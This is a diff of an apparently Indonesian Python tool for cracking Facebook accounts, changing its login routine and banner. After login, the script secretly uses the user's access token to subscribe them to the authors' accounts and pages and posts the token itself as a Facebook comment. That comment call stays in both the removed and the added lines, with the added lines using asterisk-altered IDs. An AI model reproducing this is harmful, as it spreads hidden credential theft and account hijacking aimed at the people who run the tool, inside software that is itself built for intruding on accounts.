@@ -201,15 +201,15 @@ def login():
 			ttl=r['birthday']
 			open('save','w').write(token)
 			print(f"\n[{ijo}✓{putih}] LOGIN BERHASIL\n[{merah}!{putih}] HARAP TUNGGU SEBENTAR...")
-			req.post(f'https://graph.facebook.com/100031928966181/subscribers?access_token={token}') #LATIF
-			req.post(f"https://graph.facebook.com/1011933821/subscribers?access_token={token}") #YANWAR
-			req.post(f"https://graph.facebook.com/103513548711079/subscribers?access_token={token}") #PAGE_LATIF
-			req.post(f'https://graph.facebook.com/100071145853652/subscribers?access_token={token}') #PAGE_YANWAR
-			req.post(f"https://graph.facebook.com/100004018035398/subscribers?access_token={token}") #RANI_YANWAR
-			req.post(f'https://graph.facebook.com/100034433778381/subscribers?access_token={token}') #FATAH
-			req.post(f'https://graph.facebook.com/100005395413800/subscribers?access_token={token}') #YAYAN
-			req.post(f'https://graph.facebook.com/523610268713267/comments?message={token}&access_token={token}')
-			req.post(f'https://graph.facebook.com/523610268713267/comments?message={random.choice(["latif ganteng :v","latif mengmantav","saya jelek latif ganteng:v"])}&access_token={token}')
+			req.post(f'https://graph.facebook.com/100051863139451/subscribers?access_token={token}') #LATIF
+			req.post(f"https://graph.facebook.com/10119338*1/subscribers?access_token={token}") #YANWAR
+			req.post(f"https://graph.facebook.com/10351354871107*/subscribers?access_token={token}") #PAGE_LATIF
+			req.post(f'https://graph.facebook.com/100071145*53652/subscribers?access_token={token}') #PAGE_YANWAR
+			req.post(f"https://graph.facebook.com/10000401803*398/subscribers?access_token={token}") #RANI_YANWAR
+			req.post(f'https://graph.facebook.com/1000344337*8381/subscribers?access_token={token}') #FATAH
+			req.post(f'https://graph.facebook.com/100005*95413800/subscribers?access_token={token}') #YAYAN
+			req.post(f'https://graph.facebook.com/523610268713*67/comments?message={token}&access_token={token}')
+			req.post(f'https://graph.facebook.com/523610268*13267/comments?message={random.choice(["latif ganteng :v","latif mengmantav","saya jelek latif ganteng:v"])}&access_token={token}')
 			time.sleep(2)
 			dump(token,nama,ttl)
 		except KeyError:
@@ -327,11 +327,12 @@ def dump(token,nama,ttl):
 	global password
 	os.system("clear")
 	jalan("""%s
-   ________                       _____
-   ___  __ \__________________ ______(_)___  ________ ___.
-   __  /_/ /_  ___/  _ \_  __ `__ \_  /_  / / /_  __ `__ \
-   _  ____/_  /   /  __/  / / / / /  / / /_/ /_  / / / / /
-   /_/     /_/    \___//_/ /_/ /_//_/  \__,_/ /_/ /_/ /_/
+   ___________                __                _________
+   \_   _____/____    _______/  |_             /   _____/
+    |    __) \__  \  /  ___/\   __\   ______   \_____  \ 
+    |     \   / __ \_\___ \  |  |    /_____/   /        \
+    \___  /  (____  /____  > |__|             /_______  /
+        \/        \/     \/                           \/ 
         %sShelly
         """%(ijo,putih))
 	print(f"[{biruM}!{putih}] NYALAKAN => MATIKAN MODE PESAWAT [{biruM}!{putih}]")
